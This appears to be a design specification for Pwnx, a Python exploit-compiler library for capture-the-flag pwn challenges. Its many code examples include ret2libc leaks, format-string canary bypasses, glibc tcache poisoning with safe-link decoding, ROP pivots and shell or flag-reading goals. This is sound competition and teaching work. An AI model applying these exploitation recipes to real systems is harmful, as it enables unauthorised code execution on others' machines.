# Pwnx Specification

Status: Version 0.5 canonical competition API over the verified semantic kernel  
Version: 0.5  
Language: Python 3  
Last updated: 2026-11-07

## 1. Summary

Pwnx is a Python-embedded, declarative exploit compiler.

Version 0.5 keeps the semantic kernel as the mandatory extension boundary and
makes one opinionated, fluent competition surface canonical.
Target recipes, conversations, evidence, capabilities, technique proofs, and
experiments are the primary product concepts. Compatibility helpers and
mechanism-level compilers remain available under explicit namespaces.

Heap/FSOP, bounded search, races, investigation, platform/service adapters,
protocol transforms, and raw-code experiments enter through the same
capability, proof, action, evidence, and replay contracts. They do not add
parallel technique-specific authoring models.

The competition frontend compresses common advanced mechanics—heap-menu
choreography, allocator leaks, safe-linking, finite tcache memory access, stack
control, and ORW—without exposing those internal contracts. Authors can replace
one recipe with explicit flow primitives or an opaque function boundary while
the rest of the solve remains unchanged.

The author describes:

- Facts the target reveals.
- Capabilities the author has established.
- Recipes for acquiring missing facts.
- Goals to achieve in the target.

Pwnx compiles those declarations into an inspectable, staged interaction plan.

~~~python
from pwnx import Challenge, line, pointer

c = Challenge("./chall", libc="./libc.so.6")

c.control(line("payload: "), return_at=72)

c.learn(
    c.libc.puts,
    using=c.exe.write(1, c.exe.got.puts, 8),
    receive=pointer(8),
    resume=c.exe.main,
)

c.want(c.libc.system("/bin/sh"))

c.run()
~~~

This is ordinary Python. The calls construct an exploit specification; they do
not immediately communicate with the target.

The core architectural principle is:

> The public API stays small. The compiler underneath becomes sophisticated.

## 2. Product Promise

Pwnx changes the unit of exploit authoring.

~~~text
Imperative exploit:
bytes -> send -> receive -> parse -> calculate -> pack -> send

Pwnx:
facts + capabilities + goals -> compiled interaction plan
~~~

Pwnx should:

- Remove routine send and receive choreography.
- Preserve relationships between observations, addresses, payloads, and runs.
- Infer execution order from data dependencies.
- Compile known exploitation techniques into concrete payloads.
- Model stateful target operations explicitly.
- Explain every generated stage and payload byte.
- Support unusual challenges without forcing the common case into a low-level
  API.

Pwnx does not claim to discover arbitrary vulnerabilities or automatically
invent arbitrary exploits.

## 3. Semantic Model

Pwnx has five internal concepts.

| Concept | Meaning | Common API |
| --- | --- | --- |
| Fact[T] | Something known statically, observed later, derived, or assumed | observe() |
| Capability[T] | A usable primitive with requirements and scope | control() |
| Action[T] | An ordered interaction that reads or changes target state | learn(), recipes |
| Goal | A desired target-side outcome | want() |
| Plan | A validated lowering of the specification into actions | plan() |

The normal author primarily sees four verbs:

~~~python
c.observe(...)   # The target naturally reveals a fact
c.control(...)   # The author has established a capability
c.learn(...)     # A recipe can acquire a missing fact
c.want(...)      # The desired target-side outcome
~~~

Execution is separate:

~~~python
plan = c.plan()
plan.run()
~~~

The common shorthand is:

~~~python
c.run()
~~~

## 4. Progressive Disclosure

All usage levels lower to the same internal representation.

### 4.1 Level 1: Intent recipes

The common case uses declarations only.

~~~python
c = Challenge("./chall")
c.control(c.input.line("name: ").return_address(at=72))
c.want(c.call(c.exe.win))

c.run()
~~~

A direct libc leak remains small:

~~~python
c = Challenge("./chall", libc="./libc.so.6")

c.observe("puts: {libc.puts:hex}\n")
c.control(c.input.line("payload: ").return_address(at=72))
c.want(c.libc.system("/bin/sh"))

c.run()
~~~

Advanced intent recipes remain challenge-driven:

~~~python
notes = c.heap.menu(
    b"> ",
    commands={"alloc": 1, "edit": 2, "show": 3, "free": 4, "finish": 5},
    prompts={"slot": b"idx: ", "size": b"size: ", "data": b"data: "},
)

h = c.heap(notes, glibc="2.35", slots=range(32))
uaf = h.uaf(read=notes.show, write=notes.edit)
heap = h.leak.safe_link(
    uaf, slot=0, size=0x100, bias=0, tcache_empty=True
)
h.leak.unsorted(
    uaf, slot=2, guard=3, size=0x500, bias=0x219CE0,
    arena_linked=True,
)

mem = h.tcache_poison(
    uaf,
    size=0x100,
    heap=heap,
    nodes=(heap + 0x9E0, heap + 0xC00),
)
stack = mem.read(c.libc.environ)
control = mem.return_address(stack - 0x138, trigger=notes.finish)

path = h.store(b"/flag\0", at=heap + 0x6B0)
scratch = h.reserve(0x100, at=heap + 0x7C0)
c.want(c.read_file(path, size=0x100, scratch=scratch), via=control)
~~~

This syntax declares exploitation reasoning: the vulnerable operations,
allocator version, leak relationships, poison-node addresses, storage, and
goal. Pwnx supplies the mechanical schedule, safe-link encoding, captures,
payload compiler, and stage ordering.

### 4.2 Level 2: Explicit recipes and local flows

When a fact must be acquired actively:

~~~python
c.learn(
    c.libc.puts,
    using=c.exe.write(1, c.exe.got.puts, 8),
    receive=pointer(8),
    resume=c.exe.main,
)
~~~

An advanced solve can replace one intent recipe with heap primitives without
dropping into the internal Action API:

~~~python
with h.flow("nonstandard heap disclosure") as flow:
    slot = flow.alloc(0x100, slot=10)
    flow.free(slot)
    leak = flow.show(slot).pointer()
    heap = flow.derive("heap.base", leak << 12)
~~~

Automatic slot selection is deterministic. `slot=`, `slots=`, and finite
`nodes=` pin challenge-specific choices. Exhaustion and conflicts fail during
planning, before target I/O.

Slots and poison nodes are ordered resource declarations. Tuples, lists, and
ranges are valid; sets and mappings are rejected. Reservation is atomic: a
pinned-slot conflict cannot leave partial slot ownership or consume a node.

Recipe declarations use an authoring-state transaction. Failure restores slot
ownership, access cursors, generated sequences, capabilities, narrative
assumptions, and menu operation numbering. An exception leaving `HeapFlow`
performs the same rollback.

### 4.3 Level 3: Function-backed custom boundaries

Genuinely proprietary operations use an ordinary decorated function. The
library constructs the opaque Action, contract, stable identity, fact binding,
trace, and replay boundary.

~~~python
@c.boundary(
    "proprietary leak",
    needs=[c.heap.base],
    gives=[c.libc.base],
    reads=["connection.stream", "process.heap"],
    writes=["process.facts"],
)
def proprietary(_io, facts):
    return {"libc.base": facts["heap.base"] + 0x1000}
~~~

Pwnx can schedule and record this function but cannot inspect or optimize its
internals. The weakened guarantee is local. Backend authors may still implement
providers, strategies, and Actions directly; competition solves should not need
those framework types.

One-output boundaries accept a legacy scalar or a mapping keyed by the declared
fact. Multiple outputs require a mapping containing exactly every fact key;
missing/extra keys and typed Fact validation failures are contract errors.
Boundary identity
includes code, constants, defaults, keyword defaults, and stable closure
values. Unsupported captured state requires `semantic_id=`. Replay rejects a
changed default, closure, or explicit identity.

### 4.4 Glass-box bytecraft fallback

Intent recipes own common mechanics. When the byte layout itself is challenge
knowledge, `craft()` exposes an immutable labelled layout over the same Payload
and Emit IR:

~~~python
stage = (
    c.craft("stage 2 overflow")
    .pad_to(24, fill=b"A", label="buffer")
    .word(leaks.cookie, label="stack cookie")
    .pad(8, fill=b"B", label="saved frame")
    .word(c.libc.base + 0x2A3E5, label="pop rdi")
    .ptr(c.libc.base + 0x1D8698, label="/bin/sh")
    .word(c.libc.base + 0x50D70, label="system")
    .require(no=b"\n", max_size=0x100)
)

c.send(stage, to=c.input.line(b"payload: "))
~~~

The canonical layout vocabulary is `raw`, `pad`, `pad_to`, `align`, `at`,
`int`, `word`, `ptr`, `encoded`, `require`, and explicit `replace`. Every region
has a stable label and offset. The builder inherits target endian and pointer
size unless the author overrides them.

`layout()` and `show()` are valid for unresolved symbolic layouts and expose
dependencies. `hexdump()` requires concrete bytes and raises an unresolved-value
error rather than printing placeholders. The normal planning/runtime path
resolves the same Craft into a PayloadArtifact with bytes, layout, SHA-256,
provenance, stage/send identity, hexdump, and region-diff support.

`send()` accepts an InputSurface, Channel, or callable menu operation and lowers
to ordinary Emit actions. `Plan.payloads()` inventories nested and generated
structured sends; `Plan.payload()` retrieves the planned object.
`Plan.patch_payload()` creates an immutable same-size variant with a mandatory
reason, cannot add symbolic dependencies, and remains subject to replay and
trace-diff checks.

Constraint composition is monotonic. Repeated `require()` calls union forbidden
bytes, retain the greatest minimum and smallest maximum, retain every encoding
and predicate, and reject conflicting exact/bound combinations at declaration.
Craft replacement and Plan patch variants run the complete final validation
before send, including patches to compiler-generated payloads.

PayloadArtifact is captured from the bytes, layout, dependencies, and provenance
visible at the actual Emit. It is not rebuilt from the final BindingContext.
Later invalidation/rebinding cannot rewrite it, and repeated sends of one Craft
produce separate artifacts with distinct send IDs.

Bytecraft is not a parallel packing/tube API. It is the low-level view beneath
recipes, retaining labels, facts, constraints, plan stages, trace correlation,
and replay.

Line framing is a runtime feasibility constraint when any Craft region contains
instance-scoped symbolic facts. After resolution and final validation, but
before send, pwnx checks terminator/forbidden bytes and reports the responsible
labelled dynamic region, payload offset, offending byte, and channel. Static
invalid bytes remain ordinary ConstraintError and never trigger retries; raw
channels do not impose line framing. `run(attempts=N)` retries only the dynamic
`RetryableInstanceError`, opening a fresh process or connection and closing the
failed one. EOF, prompt mismatch, and other runtime failures are not retried.
Retry metadata records the budget, attempts used, and failure messages. Multi-
attempt execution rejects explicit transports, replay, and persistent target
lifecycles because they cannot provide a fresh instance.

## 5. Target Vocabulary

A challenge owns its architecture, artifacts, configuration, values, and
symbolic namespace.

~~~python
c = Challenge(
    "./chall",
    libc="./libc.so.6",
    loader="./ld-linux-x86-64.so.2",
)
~~~

Symbol access is optimized for readability:

~~~python
c.exe.main
c.exe.got.puts
c.libc.puts
c.libc.system("/bin/sh")
~~~

Canonical explicit forms handle collisions and unusual symbol names:

~~~python
c.exe.symbol("main")
c.exe.got["puts"]
c.libc.symbol("puts")
c.libc.call("system", "/bin/sh")
~~~

Calling a symbol constructs a target-side call expression. It does not invoke
anything in the Python process.

~~~python
effect = c.libc.system("/bin/sh")
~~~

Arguments have target-side meaning:

~~~python
c.libc.system("/bin/sh")       # Target-side C string
c.exe.write(1, address, 8)     # Target-side integers and pointer
c.exe.read(0, c.exe.bss, 128)
~~~

The compiler determines string storage, calling convention, register
assignment, stack alignment, and serialization.

## 6. Fact Graph and Effect Graph

Top-level declaration order has no execution meaning.

These specifications produce the same plan:

~~~python
c.control(line("payload: "), return_at=72)
c.learn(c.libc.puts, ...)
c.want(c.libc.system("/bin/sh"))
~~~

~~~python
c.want(c.libc.system("/bin/sh"))
c.learn(c.libc.puts, ...)
c.control(line("payload: "), return_at=72)
~~~

Pure relationships form a fact graph. Stateful interactions form an effect
graph.

~~~text
Fact graph
  What depends on what?
  Pure derivations may be reordered.

Effect graph
  What must happen before what?
  Stream consumption and target mutations remain ordered.
~~~

Explicit stateful operations use sequence():

~~~python
c.sequence(
    menu.allocate(0, 0x100),
    menu.free(0),
    menu.show(0),
)
~~~

Every action declares:

~~~text
requires      facts and capabilities needed
produces      facts and capabilities created
reads         state domains inspected
writes        state domains mutated
invalidates   facts made stale
~~~

State domains include:

- Connection cursor.
- Protocol state.
- Process memory.
- Heap state.
- Filesystem state.
- Persistent service state.

## 7. observe()

observe() binds target output to symbolic facts.

The ergonomic startup form is:

~~~python
c.observe("puts: {libc.puts:hex}\n")
~~~

The explicit equivalent is:

~~~python
c.observe(
    pattern(
        b"puts: ",
        hex_pointer(c.libc.puts),
        b"\n",
    ),
    from_=c.stdout.startup,
)
~~~

Startup output is the only implicit observation source.

Output produced by an action names its source:

~~~python
shown = notes.show(3)

c.observe(
    pattern(pointer(c.heap.leak), b"\n"),
    from_=shown.output,
)
~~~

Each stream owns a cursor. If two observations could consume the same bytes,
pwnx rejects the specification unless the author:

- Combines the patterns.
- Establishes an explicit order.
- Gives each observation an unambiguous anchor.

Declaration order must never determine which matcher consumes bytes.

## 8. control()

control() declares an understood exploitation primitive.

~~~python
overflow = c.control(
    line("payload: "),
    return_at=72,
)
~~~

Constraints belong to the primitive:

~~~python
overflow = c.control(
    line(
        "payload: ",
        max_size=256,
        forbidden=b"\x00",
    ),
    return_at=72,
    stack_alignment=16,
)
~~~

A line channel implies:

- A terminator will be appended.
- The payload cannot contain that terminator internally.
- The prompt must match successfully before sending.
- Timeout and EOF are failures; neither permits the send to continue.

Other control primitives include:

~~~python
c.control(format_string(...))
c.control(arbitrary_read(...))
c.control(arbitrary_write(...))
c.control(stack_pivot(...))
c.control(heap_edit(...))
c.control(syscall(...))
~~~

These are typed capabilities. The planner cannot silently strengthen them.

## 9. learn()

learn() registers a lazy recipe for acquiring a fact.

~~~python
c.learn(
    c.libc.puts,
    using=c.exe.write(
        1,
        c.exe.got.puts,
        c.target.pointer_size,
    ),
    receive=pointer(),
    resume=c.exe.main,
)
~~~

This produces a rule:

~~~text
To establish runtime libc.puts:

Requires:
  a call or RIP-control capability
  write@plt
  known executable base
  another input opportunity after returning

Actions:
  compile write(1, puts@got, 8)
  return to main
  send generated stage
  receive one pointer

Produces:
  libc.puts address
  libc relocation hypothesis
~~~

The recipe executes only when a selected goal requires the fact.

A recipe may produce multiple facts:

~~~python
c.learn(
    [c.heap.base, c.libc.base],
    using=custom_leak,
    receive=struct(
        heap=pointer(),
        libc=pointer(),
    ),
)
~~~

## 10. want()

want() registers a target-side goal.

~~~python
c.want(c.exe.win())
c.want(c.libc.system("/bin/sh"))
c.want(c.read_file(path, size=0x100, scratch=scratch), via=control)
c.want(c.shell())
~~~

A goal describes an outcome rather than a technique.

The planner may find several ways to satisfy a goal:

~~~text
shell
├── ret2libc
├── ret2dlresolve
├── SROP execve
├── shellcode
└── one-gadget
~~~

Users guide selection without rewriting the goal:

~~~python
c.prefer(technique.ret2libc)
c.forbid(technique.one_gadget)
c.require(no_bruteforce=True)
~~~

Or pin a tactic:

~~~python
c.want(
    c.shell(),
    using=technique.dlresolve(),
)
~~~

## 11. Symbolic Values

Pwnx values are typed symbolic expressions.

~~~python
base = leaked_puts - c.libc.offset("puts")
system = base + c.libc.offset("system")
encoded = heap.protect(c.libc.stdout)
~~~

Expressions retain:

- Type.
- Width and endianness.
- Address space.
- Source facts.
- Target-instance lifetime.
- Assumptions and validations.
- Originating declaration.

Important public types include:

~~~python
Fact[T]
Expr[T]
Address[Image]
Offset[Image]
Pointer[T]
Integer[Bits, Endian]
BytesExpr
CStringExpr
PayloadExpr
Action[ResultT]
Capability[T]
Goal
Plan
~~~

Runtime tags remain authoritative because Python typing is optional.

### 11.1 Concrete-Value Boundary

These operations fail while a value is unresolved:

~~~python
int(base)
bytes(payload)

if base:
    ...
~~~

Example diagnostic:

~~~text
UnresolvedValueError

libc.base is a runtime AddressExpr.

It depends on:
  libc.puts
    obtainable through recipe "leak puts"

Use the symbolic expression directly, construct a guarded branch with
c.choose(), or resolve it inside an opaque runtime action.
~~~

Concrete access is explicit:

~~~python
run.value(base)
run.bytes(payload)
~~~

### 11.2 Pure Custom Transformations

A user may derive a fact through pure code:

~~~python
decoded = c.derive(
    custom_demangle,
    mangled,
    name="decode proprietary pointer",
)
~~~

derive() may compute facts. It cannot send, receive, allocate, or register
hidden actions.

## 12. Lifetimes and Invalidation

Every value belongs to the narrowest scope where it remains valid.

~~~text
Artifact
  symbol offsets, architecture, gadget descriptions

Service instance
  account state or persistent service-global data

Process instance
  ASLR bases, heap addresses, stack addresses, memory contents

Connection
  stream position, negotiated state, session identifiers
~~~

Target profiles describe lifecycle behavior:

~~~python
c.remote(
    "challenge.example",
    31337,
    process="fresh-per-connection",
    service="persistent",
)
~~~

Rules:

- Reconnect always invalidates connection facts.
- Reconnect invalidates process facts unless process persistence is declared.
- Restart invalidates process and connection facts.
- Artifact facts survive while artifact identity remains the same.
- Facts from failed search attempts cannot escape into later attempts.
- A locally learned address cannot enter a payload for a remote process.

Pwnx rejects stale values before sending.

## 13. Protocols and Codecs

Pwnx uses one symmetric codec abstraction.

~~~python
class Codec[T]:
    def parse(data, context) -> T: ...
    def build(value, context) -> bytes: ...
    def validate(value, context) -> None: ...
    def explain(value, context) -> Layout: ...
~~~

Built-in codecs include:

~~~text
pointer
hex_pointer
word
cstring
line
frame
struct
checksum
xor
compression (zlib, gzip, bz2, lzma)
hash/HMAC authentication
safe_linked_pointer
~~~

The same codec:

- Parses incoming data.
- Builds outgoing data.
- Validates constraints.
- Describes bytes in diagnostics.

A custom framed protocol remains declarative:

~~~python
packet = frame(
    bytes_().through(
        CompressionTransform("gzip", max_decoded_size=1 << 20),
        ChecksumTransform(CRC32),
        DigestTransform(
            "sha256",
            key=session_key,
            key_ref="credential:challenge-hmac",
        ),
    ),
    length=u16be,
    max_size=1 << 20,
)
~~~

Transforms run in declared wire order and reverse during parsing. Variable-size
pipelines require a frame for reads. Decompression has encoded, decoded, and
ratio limits and rejects truncation or trailing data. CRC and unkeyed hashes
claim error detection/integrity only; HMAC is the authentication transform.
HMAC trace metadata contains only the caller's opaque `key_ref`; it never
contains the key or a deterministic digest of the key.

Higher-level protocols lower into a small interaction IR:

~~~text
Connect
Emit
Expect
Capture
Parse
Assert
Restart
Close
Opaque
~~~

A menu helper is convenience syntax over those primitives:

~~~python
notes = c.protocol.menu(b"> ").define(
    add=choice(
        b"1",
        field(b"idx: ", integer()),
        field(b"size: ", integer()),
        field(b"content: ", bytes_()),
    ),
    free=choice(
        b"2",
        field(b"idx: ", integer()),
    ),
    show=choice(
        b"3",
        field(b"idx: ", integer()),
        returns=line(),
    ),
)
~~~

## 14. Planning

Planning never communicates with the target.

~~~python
plans = c.plan()
plans.show()
~~~

Planning performs:

1. Static artifact analysis.
2. Fact and capability graph construction.
3. Candidate technique expansion.
4. Fact and effect dependency validation.
5. Payload and channel constraint solving.
6. Lifetime validation.
7. Stable candidate ranking.
8. Lowering into concrete interaction IR.

Multiple applicable techniques are retained.

A stable cost tuple ranks candidates:

~~~text
reliability
live stage count
restart count
number of runtime guesses
payload size
explicit user preference
stable technique identifier
~~~

The planner selects a default plan while preserving alternatives:

~~~python
plans.selected
plans.alternatives
plans.explain_selection()
~~~

Example:

~~~text
Selected: ret2libc

Rejected: one-gadget
  reason: required register constraints cannot be established

Rejected: dlresolve
  reason: larger payload and an additional live stage

Alternative: SROP
  reliability: conditional
  cost: one additional stage
~~~

Planning must not:

- Open a target connection.
- Execute the target.
- Run an opaque action.
- Change debugger or host state.
- Query an external service unless explicitly requested.
- Invoke expensive symbolic discovery implicitly.

## 15. Technique Contract

A technique plugin declares:

~~~text
requires
provides
static predicates
runtime constraints
state reads and writes
invalidations
cost
reliability
lower()
verify()
explain()
~~~

Conceptual example:

~~~python
@technique(
    name="ret2dlresolve",
    requires=[
        RIPControl,
        WritableMemory,
        InputRead,
        DynamicLinker,
    ],
    provides=[
        DynamicCall,
    ],
    reliability="conditional",
)
def dlresolve(t):
    ...
~~~

A technique emits pwnx IR and structured payload expressions. It cannot
directly perform I/O.

`lower()` receives only a planning context. Lowering is recursive and must be
complete before the target is opened; runtime execution cannot reveal another
hidden action graph. All resulting atomic actions pass through one contract
boundary for requirements, constraints, invalidations, and verified products,
regardless of whether they use direct `execute()`, a registered executor, or
replay.

Requirement matching is structural. A fact matches only when its name, Sort
semantics, scope, and artifact identity agree. A capability matches when its
effect contract and scope prove the requested primitive; a shared label is not
proof. Runtime bindings execute the retained Sort validator and permit a stale
epoch value to be replaced only after the corresponding lifecycle transition.

Constraint identity is also semantic. Predicates with stable code, constants,
defaults, and closure values receive a derived identity; predicates that close
over application objects declare an explicit `semantic_id`. Names alone and
object/function repr addresses never establish constraint equivalence.

Action fact changes commit transactionally:

1. Validate and snapshot requirements.
2. Execute while consumed facts remain readable.
3. Capture all declared fact and capability products.
4. Commit canonical, deterministically deduplicated invalidations.
5. Restore and verify the captured products.

Bindings use bounded copy-in/copy-out snapshots for portable containers and
deeply snapshot-safe frozen values. Cycles and unknown mutable objects are
rejected before effects, and resolved mutable values never alias stored fact
state. A fact that is both provided and invalidated must be explicitly rebound
during that execution, even if its replacement compares equal; an unchanged
generation is not a product.

An exception before commit restores fact state and applies no central
invalidation. If an external effect succeeds but product validation or commit
fails, pwnx rolls back fact state and records `contract_failures` evidence that
the external effect itself cannot be rolled back.

Technique families may include:

- ROP calls and register goals.
- SROP through an explicit, versioned target ABI schema.
- ret2dlresolve.
- Format-string reads and writes.
- DynELF-style symbol resolution.
- Heap techniques.
- FSOP.
- Shellcode.
- ORW construction.
- Seccomp-aware syscall selection.

Pwnx should not require pwntools. A compatibility backend may exist during
development.

## 16. Stateful Advanced Features

### 16.1 Guarded Branches

Runtime facts may select among branches already visible during planning:

~~~python
c.choose(
    when=leak.low(12).equals(expected_offset),
    then=known_libc,
    otherwise=identify_libc,
)
~~~

Both branches appear in plan().

Runtime callbacks cannot secretly generate new action graphs.

### 16.2 Search and Brute Force

Search is a bounded action with explicit attempt isolation and reset policy:

~~~python
from pwnx import SearchAction

canary = SearchAction(
    byte_values(),
    attempt=probe_canary_byte,
    success=lambda result: result.accepted,
    reset=fresh_process,
    budget=256,
    attempt_deadline=0.5,
    invalidates=("process",),
    scheduler="processes",
)
~~~

Each attempt receives isolated facts. The result records every candidate,
reset, response, timeout, and stopping condition. Replay returns that recorded
result without probing the target again. The process scheduler requires host
fork isolation and terminates a timed-out worker before reset or the next
attempt; unsupported hosts fail explicitly before a callback runs.

### 16.3 Races

Concurrency is never inferred:

~~~python
from pwnx import RaceAction, RaceLane

race = RaceAction(
    (
        RaceLane("writer", writer),
        RaceLane("reader", reader),
    ),
    success=lambda attempt: any(
        lane.lane == "reader" and lane.value == b"won"
        for lane in attempt.lanes
    ),
    barrier="simultaneous-start",
    deadline=0.5,
    max_attempts=100,
    restart=fresh_service,
    scheduler="processes",
)
~~~

A race declares:

- Lanes.
- Synchronization.
- Deadline.
- Restart policy.
- Success predicate.
- Attempt budget.

Ordinary actions are never made concurrent implicitly. A race is one explicit
opaque-effect boundary whose inputs, lifecycle changes, and portable result are
recorded for replay.

### 16.4 Stack Leak and Protected Return Control

The primary stack-flow helpers compress the common CTF sequence “leak named
stack values, relate an image base, preserve a canary, then use control”:

~~~python
leaks = c.format_leak(
    c.input.line(b"sing> "),
    canary=9,
    libc=11,
    prefix=b"The canary tilts its head: ",
    separator=b"|",
)

c.relate(c.libc.base, leaks.libc - 0x29CA8)

control = c.control(
    c.input.line(b"sing> ").return_address(
        at=40,
        canary=(24, leaks.canary),
    )
)

c.want(c.shell(), via=control)
c.run(attempts=64)
~~~

Named keyword order defines both the generated positional format payload and
capture order. Positions must be positive and unique. `prefix` is consumed
before the first capture; `separator` delimits the named hexadecimal pointers.
The returned namespace exposes symbolic fields by name.

`relate(target, expression)` registers a visible symbolic binding action. It is
the primary spelling for a known leak/base equation and requires no lambda or
custom Action.

`return_address(at=..., canary=(offset, fact))` adds the canary as a protected
qword in the overflow prefix. Protected words must be aligned, fit before the
saved return address, and not overlap one another. Payload lowering fills gaps,
places protected words, and appends the selected control-flow chain. The
planner orders the format exchange and relationship before the payload that
depends on them.

`Plan.show()` renders names, positions, prefix/separator, relationship,
protected offsets, return offset, and selected technique without raw bytes.
`Plan.expand(stage)` exposes the exact format payload, prompts, codecs, sparse
overflow layout, and generated chain actions.

`examples/cage.py` is the canonical quick stack solve. It has executed locally
against the real Cage artifact. The opt-in Docker test uses
`PWNX_CAGE_CHALLENGE=/path/to/cage-directory` plus `PWNX_RUN_CTF_E2E=1` and
requires `cage`, its supplied libc/loader, and `solve_pwnx.py`.

### 16.5 Heap Exploitation

The competition-facing heap API maps a conventional indexed menu onto
allocator recipes. The author declares the vulnerable operations and
challenge-specific relationships; the library realizes the mechanics:

~~~python
notes = c.heap.menu(
    b"> ",
    commands={"alloc": 1, "edit": 2, "show": 3, "free": 4, "finish": 5},
    prompts={"slot": b"idx: ", "size": b"size: ", "data": b"data: "},
)

h = c.heap(notes, glibc="2.35", slots=range(32))
uaf = h.uaf(read=notes.show, write=notes.edit)
heap = h.leak.safe_link(
    uaf, slot=0, size=0x100, bias=0, tcache_empty=True
)
h.leak.unsorted(
    uaf, slot=2, guard=3, size=0x500, bias=0x219CE0,
    arena_linked=True,
)

memory = h.tcache_poison(
    uaf,
    size=0x100,
    heap=heap,
    nodes=(heap + 0x9E0, heap + 0xC00),
)
~~~

Each memory read/write consumes one declared safe-link node and a deterministic
set of menu slots. Authors may pin those slots. The recipe reports exhausted
nodes, read-only primitives, missing allocator semantics, conflicting slots,
and missing challenge offsets during planning.

Slot domains, pinned slot groups, and poison nodes are ordered resources.
Tuples, lists, and ranges are accepted; sets and mappings are rejected.
Reservation validates the complete slot group before committing it. A failed
reservation restores the node cursor, so retrying with valid pinned slots uses
the same node.

Frontend authoring uses a central resource transaction. A failing leak,
storage, access, or flow declaration restores slots, access cursors, generated
sequences, capabilities, narrative assumptions, and menu operation numbering.

A singleton safe-link leak provides the fd-field page. It does not prove the
heap base. `page_to_base=` (with `bias=` as an alias) is required, including
explicit zero when local evidence proves equality. Tcache link encoding follows
the declared AllocatorModel: models without safe-linking use the target value;
safe-linked models encode it with the declared node address. Unsorted-bin leaks
reject normalized sizes that remain tcache eligible.

AllocatorModel is the single source for request normalization and tcache
eligibility. The shipped glibc models use a normalized `tcache_max` of `0x410`:
request `0x408` normalizes to `0x410` and is eligible, while `0x409` normalizes
to `0x420` and is ineligible. Both tcache-poison and unsorted-bin recipes use
`model.tcache_eligible()`. A challenge may pass a tuned `model=` instead of
`glibc=`; supplying both is an error.

Safe-link singleton decoding requires `tcache_empty=True`,
`state="singleton"`, or an explicit grooming `assumption`. Unsorted disclosure
requires `arena_linked=True` or an explicit arena-link assumption. Pwnx records
these claims in `Plan.assumptions`; they are neither inferred nor hidden.

Safe-linked tcache access consumes concrete ordered fd-field addresses from
`nodes=`. A pre-safe-linking model may instead use `uses=N`, which creates a
finite operation-token budget without fabricating node addresses.

A UAF byte writer is not automatically a tcache forward-pointer writer.
Poisoning requires an operation that encodes and sends one complete target word
through `write_word=`. The standard HeapMenuAdapter declares `edit_word`.

The frontend owns prompt synchronization, qword encoding, safe-link arithmetic,
captures, bindings, and tcache grooming. `read_file()` combines the resulting
stack control with library-owned ORW compilation. `plan.show()` summarizes the
semantic exploit stages; `plan.expand(stage)` exposes the complete generated
menu and payload choreography.

HeapFlow is the local primitive fallback for a nonstandard stage. The internal
`AllocatorModel`, `HeapState`, `HeapTechniqueRegistry`, and `TechniqueProof`
APIs remain available to extension authors, but ordinary competition scripts
do not import them.

`h.store()` and `h.reserve()` return HeapStorage with owner, address, size,
slot, and stored-data evidence. `read_file()` accepts storage and return control
only from the same Challenge/HeapExploit, requires a NUL-terminated stored path,
and requires scratch capacity at least equal to the requested read. Raw address
inputs require explicit `path_size=` or `scratch_size=` because ownership and
capacity cannot otherwise be proved. HeapStorage requires a positive size,
non-negative in-domain slot, and non-empty semantic role.

### 16.6 Constrained Control Flow

Some challenges provide a controlled encoded buffer, an indexed indirect call,
and useful register state rather than a conventional return-address overflow.
The author declares those unusual relationships and pins gadgets by semantics.
The primary competition syntax is a thin natural veneer:

~~~python
store = c.menu(
    b"> ",
    message=(1, b"Message?", bytes),
    color=(2, b"> ", int),
    show=3,
)

message = c.buffer(
    at=0x2F9E38, size=0x1000, encoding="utf8"
).written_by(store.message)

dispatch = c.control(store.color.indexes(
    table=0x2F08E8,
    target=message.qword(80),
    trigger=store.show,
    eax=message,
))
pivot = c.control(
    dispatch.pivot(register="eax", stack=message, gadget=0x242D79)
)

palette = (
    c.rop(utf8())
    .pop("rdi", 0x243565)
    .pop("rsi", 0x243431)
    .zero("rax", 0x247431)
    .move("rdx", "rax", 0x2B184E)
    .pop("rcx", 0x247566)
    .move("rax", "rcx", 0x2B4E73)
    .syscall(0x2A6602)
)

c.want(c.execve("sh"), via=pivot, using=palette)
~~~

This is pure syntax compression. `c.menu()` creates ordinary protocol objects;
`buffer.qword(offset)` is a bounded qword slice; operation `.indexes()`, the
explicit register/stack pivot, and fluent `c.rop()` builder delegate to the
same semantic objects. They
produce identical plan IR, lowered Actions and contracts, channels, codecs,
payload, computed index, execution, and replay behavior. Pwnx
does not introduce arithmetic/operator-overload exploit syntax or infer the
challenge relationships.

`written_by(QuickOperation)` requires the selected operation to contain exactly
one bytes-compatible field. Pwnx caps an inferred bytes codec at the controlled
buffer size and preserves any smaller explicit bound. It returns a distinct
immutable QuickOperation/Choice view; the original operation, Menu choices, and
sibling codecs are unchanged. Binding the same operation to multiple buffers is
order-independent. The views share only the underlying Menu's monotonic
operation counter, so explicit and natural calls use one deterministic ID
sequence.

The equivalent explicit fallback remains available for unusual schemas:

~~~python
from pwnx.advanced import controlled_buffer, pivot, rop_palette
~~~

These advanced helpers and their implementation types are not re-exported from
the primary namespace. See `examples/message_store_constrained.py` for the
complete explicit form; it lowers identically to the canonical 0.5 solve.

The author owns the challenge facts: buffer/table addresses, target qword,
register relationship, pivot gadget, and semantic gadget palette. Pwnx owns:

- validating every pinned qword and the final payload against the declared byte
  constraints;
- computing the aligned table index from `(target - table) / entry_size`;
- proving the pointer register names the controlled buffer;
- placing the execve string and dispatch qword without overlap;
- realizing the required register state from `pop`, `zero`, and `move`
  semantics;
- emitting buffer write, index operation, and trigger in order.

The controlled buffer supports explicit or automatically aligned data
placement. One region map reserves stored data, each generated ROP qword, the
dispatch qword, and the generated path. Overlap errors name both roles and
exact ranges. `qword()` creates bounded target slices. The shipped constraint
is `utf8()`. The fluent builder records `pop`, `zero`, `move`, and `syscall`
semantics; it does not discover gadgets.

Missing register realizations, invalid encoded addresses, out-of-range slices,
unaligned table targets, incorrect register state, and impossible string/layout
placement fail during planning. `Plan.show()` renders semantic buffer,
table/target/index, register-state, pivot, palette, and strategy fields without
raw payload bytes. `Plan.expand(stage)` shows the exact encoded buffer payload,
computed index, and trigger actions.

The primary `examples/message_store_sugar.py` solve and its explicit fallback
`examples/message_store_constrained.py` describe the same exploit; the solve
has executed locally against the real Dice challenge. Regression tests also execute its
generated UTF-8 payload/index/trigger choreography and replay the trace without
live target effects. The opt-in E2E test runs the actual challenge in Docker
when `PWNX_RUN_CTF_E2E=1` and `PWNX_DICE_CHALLENGE` points to the directory
containing `challenge` and `solve_pwnx.py`, then confirms a shell sentinel.

Preparing a constrained goal is transactional with respect to protocol
operation IDs. Successful preparation consumes unique IDs for its writer,
computed index, and trigger. Any preparation failure restores all discovered
menu counters. The cache is keyed by ControlledBuffer revision; repeated plan
